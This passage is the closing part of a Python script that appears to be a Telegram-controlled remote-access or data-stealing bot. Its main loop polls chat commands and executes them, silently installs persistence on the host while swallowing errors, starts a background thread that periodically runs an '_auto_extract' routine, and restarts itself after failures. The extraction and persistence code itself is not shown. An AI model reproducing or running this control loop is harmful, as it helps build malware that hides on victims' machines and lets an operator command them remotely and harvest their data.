        errors = 0
        for upd in updates.get('result', []):
            offset = upd['update_id'] + 1
            msg    = upd.get('message', {})
            text   = msg.get('text', '')
            cid    = msg.get('chat', {}).get('id')
            if text.startswith('/') and cid:
                try:
                    handle_command(text, cid)
                except Exception as e:
                    send_message(f'❌ Error: {e}', cid)
        time.sleep(1)

# ============================= MAIN =============================


def main():
    if not _acquire_lock():
        sys.exit(0)

    if AUTO_PERSIST:
        try:
            install_persistence()
        except Exception:
            pass

    if CHECK_INTERVAL > 0:
        threading.Thread(target=_auto_extract, daemon=True).start()

    while True:
        try:
            run_bot()
        except KeyboardInterrupt:
            send_message('🛑 Bot stopped.')
            break
        except Exception:
            time.sleep(60)


if __name__ == '__main__':
    main()
